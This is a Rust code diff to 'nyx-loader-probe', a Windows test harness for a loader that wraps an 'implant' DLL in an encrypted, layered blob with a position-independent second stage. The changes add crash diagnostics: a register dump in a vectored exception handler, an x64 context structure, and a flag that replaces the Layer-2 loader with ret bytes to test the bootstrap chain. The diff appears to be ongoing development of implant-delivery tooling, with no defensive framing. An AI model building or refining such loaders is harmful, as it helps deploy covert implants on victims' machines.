@@ -88,9 +88,18 @@ mod veh {
                 let (base, len) = unsafe { (BLOB_BASE, BLOB_LEN) };
                 let rel = rip.checked_sub(base).unwrap_or(usize::MAX);
                 let inside = rel < len;
+                let img = unsafe { IMG_BASE };
+                let in_img = img != 0 && rip >= img && rip < img + 0x10_0000;
+                // Context dump: the faulting frame's GP registers (readable via
+                // the Context in ExceptionPointers on x64).
+                let ctx = unsafe { &*((*ep).context_record as *const Context) };
                 eprintln!(
-                    "[veh] exception 0x{code:08X} at RIP=0x{rip:x} base=0x{base:x} len=0x{len:x} rel=0x{rel:x}{}",
-                    if inside { " (INSIDE BLOB)" } else if rel == usize::MAX { " (BELOW BLOB - image/other)" } else { " (ABOVE BLOB)" }
+                    "[veh] exc=0x{code:08X} rip=0x{rip:x} base=0x{base:x} len=0x{len:x} rel=0x{rel:x} in_blob={inside} in_img={in_img}\n"
+                );
+                eprintln!(
+                    "[veh]   rax=0x{:x} rbx=0x{:x} rcx=0x{:x} rdx=0x{:x} rsi=0x{:x} rdi=0x{:x} rsp=0x{:x} rbp=0x{:x} r8=0x{:x} r9=0x{:x} r10=0x{:x} r11=0x{:x}",
+                    ctx.m_x64_rax, ctx.m_x64_rbx, ctx.m_x64_rcx, ctx.m_x64_rdx, ctx.m_x64_rsi, ctx.m_x64_rdi, ctx.m_x64_rsp, ctx.m_x64_rbp,
+                    ctx.m_x64_r8, ctx.m_x64_r9, ctx.m_x64_r10, ctx.m_x64_r11
                 );
             }
             // Continue searching (default): let the OS terminate as usual.
@@ -102,19 +111,77 @@ mod veh {
         addr
     }
 
+    #[repr(C)]
+    pub struct Context {
+        pub p1_home: u64,
+        pub p2_home: u64,
+        pub p3_home: u64,
+        pub p4_home: u64,
+        pub p5_home: u64,
+        pub p6_home: u64,
+        pub context_flags: u32,
+        pub m_x64_dr0: u64,
+        pub m_x64_dr1: u64,
+        pub m_x64_dr2: u64,
+        pub m_x64_dr3: u64,
+        pub m_x64_dr6: u64,
+        pub m_x64_dr7: u64,
+        pub float_save: [u8; 0x200],
+        pub m_x64_seg_gs: u32,
+        pub m_x64_seg_fs: u32,
+        pub m_x64_seg_es: u32,
+        pub m_x64_seg_ds: u32,
+        pub m_x64_edi: u32,
+        pub m_x64_esi: u32,
+        pub m_x64_ebx: u32,
+        pub m_x64_edx: u32,
+        pub m_x64_ecx: u32,
+        pub m_x64_eax: u32,
+        pub m_x64_rbp: u64,
+        pub m_x64_rip: u64,
+        pub m_x64_eflags: u32,
+        pub m_x64_seg_cs: u32,
+        pub m_x64_seg_ss: u32,
+        pub m_x64_rsp: u64,
+        pub m_x64_rax: u64,
+        pub m_x64_rcx: u64,
+        pub m_x64_rdx: u64,
+        pub m_x64_rbx: u64,
+        pub m_x64_rsi: u64,
+        pub m_x64_rdi: u64,
+        pub m_x64_r8: u64,
+        pub m_x64_r9: u64,
+        pub m_x64_r10: u64,
+        pub m_x64_r11: u64,
+        pub m_x64_r12: u64,
+        pub m_x64_r13: u64,
+        pub m_x64_r14: u64,
+        pub m_x64_r15: u64,
+    }
+
     pub static mut BLOB_BASE: usize = 0;
     pub static mut BLOB_LEN: usize = 0;
+    pub static mut IMG_BASE: usize = 0;
 }
 
 #[cfg(target_os = "windows")]
 fn main() -> ExitCode {
-    let dll_path = match std::env::args().nth(1) {
-        Some(p) => p,
+    // Image base for fault classification (VEH compares RIP against it).
+    extern "system" {
+        fn GetModuleHandleW(name: *const u16) -> *mut c_void;
+    }
+    let img_base = unsafe { GetModuleHandleW(std::ptr::null()) as usize };
+    unsafe { veh::IMG_BASE = img_base };
+
+    let args: Vec<String> = std::env::args().collect();
+    let dll_path = match args.iter().find(|a| !a.starts_with("--")) {
+        Some(p) => p.clone(),
         None => {
-            eprintln!("usage: nyx-loader-probe.exe <implant-dll>");
+            eprintln!("usage: nyx-loader-probe.exe [--layer2-ret] <implant-dll>");
             return ExitCode::from(2);
         }
     };
+    let layer2_ret = args.iter().any(|a| a == "--layer2-ret");
     let dll_bytes = match std::fs::read(&dll_path) {
         Ok(b) => b,
         Err(e) => {
@@ -127,13 +194,26 @@ fn main() -> ExitCode {
         dll_bytes.len()
     );
 
-    let blob = match nyx_loader::wrap_payload(&dll_bytes, &nyx_loader::LoaderConfig::random()) {
+    let mut blob = match nyx_loader::wrap_payload(&dll_bytes, &nyx_loader::LoaderConfig::random()) {
         Ok(b) => b,
         Err(e) => {
             eprintln!("error: wrap_payload failed: {e}");
             return ExitCode::from(2);
         }
     };
+    // --layer2-ret: replace the Layer-2 region with `ret` so the probe chain
+    // (Layer-1 scan -> bridge -> jmp -> return) is validated WITHOUT the
+    // pic-loader executing. Layer-2 starts at LAYER1_BOOTSTRAP.len() + KEY_LEN
+    // + header(20) + ct_len + TAG_LEN.
+    if layer2_ret {
+        use nyx_loader::{CIPHERTEXT_OFFSET, KEY_LEN, LAYER1_BOOTSTRAP, TAG_LEN};
+        let layer2_off =
+            LAYER1_BOOTSTRAP.len() + KEY_LEN + CIPHERTEXT_OFFSET + dll_bytes.len() + TAG_LEN;
+        if layer2_off < blob.len() {
+            blob[layer2_off..].fill(0xC3);
+            println!("[probe] --layer2-ret: Layer-2 region replaced with ret");
+        }
+    }
     println!(
         "[probe] blob: {} bytes (Layer-1 + key + header + ct + Layer-2)",
         blob.len()
